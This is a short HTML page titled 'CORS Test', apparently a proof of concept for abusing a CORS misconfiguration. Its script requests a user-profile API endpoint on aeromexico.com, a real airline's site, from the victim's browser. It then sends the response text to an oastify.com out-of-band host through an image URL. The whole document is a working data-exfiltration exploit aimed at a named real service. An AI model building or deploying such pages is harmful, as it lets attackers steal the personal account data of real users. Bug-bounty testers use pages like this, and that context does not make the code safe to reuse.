<!DOCTYPE html>
<html>
<head>
    <title>CORS Test</title>
</head>
<body>
    <script type="text/javascript">
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://aeromexico.com/api/v4/profile/user-profile', true);
        xhr.setRequestHeader('Origin', 'http://<your-collaborator-id>.burpcollaborator.net');
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var img = new Image();
                img.src = 'http://gyipja1lt51redrzk38ulumbk2qtenhb6.oastify.com/log?data=' + encodeURIComponent(xhr.responseText);
            }
        };
        xhr.send();
    </script>
</body>
</html>
